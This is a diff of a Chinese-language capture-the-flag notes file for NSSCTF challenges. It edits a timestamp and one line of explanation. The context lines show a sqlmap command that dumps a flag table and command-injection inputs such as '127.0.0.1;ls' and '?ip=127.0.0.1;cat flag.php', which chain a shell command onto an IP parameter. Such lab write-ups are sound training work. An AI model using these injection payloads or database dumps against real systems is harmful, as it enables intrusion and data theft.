@@ -12,7 +12,7 @@ tags:
   - NSSCTF
   - 五题积累
 created: 2026-03-15T16:49
-updated: 2026-11-18T20:36
+updated: 2026-11-18T20:38
 ---
 
 # 第一轮
@@ -884,7 +884,7 @@ sqlmap -u "http://node5.anna.nssctf.cn:25436/?id=1" -D ctftraining -T flag --dum
 试试注入命令：127.0.0.1;ls
 ![](NSSCTF五题积累（七）/file-20261118203016012.png)能回显目录，注入成立。
 ![](NSSCTF五题积累（七）/file-20261118203605721.png)
-页面源码里看到 `?ip=` ，这题参数名就是 `ip`
+页面源码里看到这题参数名就是 `ip`
 大胆一点：?ip=127.0.0.1;cat flag.php
 ![](NSSCTF五题积累（七）/file-20261118203119039.png)
 被拦 ，存在 WAF
